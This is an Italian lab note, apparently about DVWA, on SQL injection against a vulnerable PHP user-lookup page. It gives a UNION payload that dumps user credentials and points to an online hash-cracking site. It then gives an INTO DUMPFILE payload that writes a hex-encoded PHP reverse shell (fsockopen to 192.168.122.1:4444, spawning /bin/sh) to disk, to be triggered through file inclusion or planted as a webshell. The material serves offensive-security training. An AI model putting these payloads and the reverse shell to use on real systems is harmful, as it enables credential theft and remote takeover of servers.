
# Codice vulnerabile

```php
<?php    

if(isset($_GET['Submit'])){
    
    // Retrieve data
    
    $id = $_GET['id'];

    $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
    $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );

    $num = mysql_numrows($result);

    $i = 0;

    while ($i < $num) {

        $first = mysql_result($result,$i,"first_name");
        $last = mysql_result($result,$i,"last_name");
        
        echo '<pre>';
        echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
        echo '</pre>';

        $i++;
    }
}
?>
```

![](attachments/Pasted%20image%2020250526123533.png)

L'idea è quella di interrompere la query SQL con l'immissione del carattere apice `'` e scrivere query arbitrarie per recuperare tutte le informazioni utili dal database.

`1' UNION SELECT user, password FROM users -- -`


![](attachments/Pasted%20image%2020250526123547.png)

Per crackare hash semplici si puo' usare il sito: https://weakpass.com/tools/lookup


Con una SQL injection di tipo **Union** o di tipo **Stacked** ( ovvero che accetta il carattere terminatore `;`), si possono anche scrivere file sul file system:

`1' UNION ALL SELECT 0x3c3f7068702024736f636b3d66736f636b6f70656e28223139322e3136382e3132322e31222c34343434293b2470726f633d70726f635f6f70656e28222f62696e2f7368202d69222c617272617928303d3e24736f636b2c20313d3e24736f636b2c20323d3e24736f636b292c20247069706573293b203f3e0a,NULL INTO DUMPFILE '/tmp/simple.php' -- -`

```
1' UNION ALL SELECT 0x3c3f7068702024736f636b3d66736f636b6f70656e28223139322e3136382e3132322e31222c34343434293b2470726f633d70726f635f6f70656e28222f62696e2f7368202d69222c617272617928303d3e24736f636b2c20313d3e24736f636b2c20323d3e24736f636b292c20247069706573293b203f3e0a,NULL INTO DUMPFILE '/tmp/blabla.php' -- -
```

Per ottenere l'hex del file:

`cat rev.php | xxd -p | tr -d '\n'`

```php
<?php $sock=fsockopen("192.168.122.1",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
```

Avendo salvato il file sotto `/tmp/simple.php`, possiamo richiamarlo tramite la vulnerabilità **File Inclusion**.

In alternativa si puo' scrivere una webshell, salvarla all'interno della web directory `/var/www/dvwa/simple.php` e richiamarla dal browser.